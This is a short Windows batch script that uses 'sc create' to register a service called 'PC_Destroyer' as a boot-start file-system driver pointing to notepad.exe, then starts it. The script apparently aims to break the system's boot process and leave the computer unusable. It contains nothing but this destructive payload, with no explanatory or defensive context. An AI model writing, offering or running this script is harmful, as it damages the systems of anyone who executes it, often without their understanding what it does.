@ECHO OFF

sc create PC_Destroyer type= filesys start= boot BinPath= C:\Windows\System32\notepad.exe

sc start PC_Destroyer